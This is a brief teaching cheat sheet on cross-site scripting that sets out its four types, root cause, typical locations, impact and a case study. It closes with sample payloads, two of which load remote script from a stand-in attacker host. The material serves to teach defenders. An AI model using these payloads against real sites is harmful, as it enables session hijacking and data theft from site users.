XSS Types & Why They Matter

What each type is

  • Reflected: payload in request → instantly echoed.
  • Stored: saved server-side → later viewed by others.
  • DOM: entirely client-side, no new HTTP request.
  • Mutation: browser rewrites markup into executable code.

Root cause

Same-origin blending: user data becomes browser structure without re-encoding for that structure.

Real-world homes

Search boxes (reflected), comments (stored), SPA hash routing (DOM), file uploads (mutation via SVG).

Impact ladder

Reflected → 1 victim; Stored → N victims; DOM → bypasses WAF; Mutation → bypasses HTML sanitiser libraries.

Mini case-study

2022 WordPress 5.9 stored XSS in comment reply → auto-loaded on admin dashboard → 4.3 M sites affected.

Payloads

// Reflected → stored via CDN cache
GET /search?q=<svg onload=import('//att/m')>
// JSON stored, later rendered as HTML
{"name":"John<script src=//att/j>"}
// No server hit, pure DOM
target.postMessage({html:'<img src=x onerror=alert(1)>'},'*')
// Chrome < 89 parser bug
<table><math><mi//xss><script>alert(1)</script>
